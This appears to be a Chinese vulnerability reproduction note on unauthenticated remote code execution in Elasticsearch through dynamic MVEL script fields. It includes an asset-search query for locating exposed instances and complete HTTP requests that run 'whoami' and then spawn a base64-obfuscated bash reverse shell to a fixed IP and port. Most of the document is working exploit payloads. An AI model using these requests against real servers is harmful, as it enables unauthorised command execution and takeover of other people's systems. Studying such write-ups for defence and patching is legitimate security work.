# Elasticsearch存在未授权访问导致的RCE

# 一、漏洞描述
Elasticsearch向使用者提供执行脚本代码的功能，支持mvel, js,groovy,python,和native语言，默认脚本语言为mvel。由于mvel语言功能较为强大，可以直接执行java代码，而且官方默认没有关闭用户可通过http操控这一功能的接口（script.disable_dynamic），从而导致恶意用户可以通过这个功能远程执行任意Java代码。

# 二、影响版本
Elasticsearch

# 三、资产测绘
```plain
app="Elasticsearch"
```

![1730009233361-9686bf63-9f51-42ac-819e-9bd09b99b929.png](./img/TxmiYf429ZjwRJZL/1730009233361-9686bf63-9f51-42ac-819e-9bd09b99b929-467988.png)

# 三、漏洞复现
1、利用该漏洞要求Elasticsearch中有数据，所以先创建一条数据

```plain
POST /website/blog/ HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

{
    "name": "colleget"
}
```

![1730009268228-6be55838-f010-42a4-af81-58585f9a0c3b.png](./img/TxmiYf429ZjwRJZL/1730009268228-6be55838-f010-42a4-af81-58585f9a0c3b-040576.png)

2、执行命令

```plain
POST /_search?pretty HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 372

{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}
    }
}
```

![1730009338548-ecd2b298-f883-4d55-a4f4-f1f9a5899149.png](./img/TxmiYf429ZjwRJZL/1730009338548-ecd2b298-f883-4d55-a4f4-f1f9a5899149-827979.png)

3、反弹shell

```plain
POST /_search?pretty HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 372

{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"bash -c {echo,YmFaaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjcwLzc1MzIgMD4mMQ==}|{base64,-d}|{bash,-i}\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}
    }
}

```

![1730009417293-ec63d02a-a5e8-4a7d-b995-fdeec28609ca.png](./img/TxmiYf429ZjwRJZL/1730009417293-ec63d02a-a5e8-4a7d-b995-fdeec28609ca-440486.png)

![1730009433078-7c95d622-3e9c-42d4-b0f8-62007c8a37a9.png](./img/TxmiYf429ZjwRJZL/1730009433078-7c95d622-3e9c-42d4-b0f8-62007c8a37a9-907022.png)



> 更新: 2024-11-27 10:04:43  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kg7yzqstede6zu7x>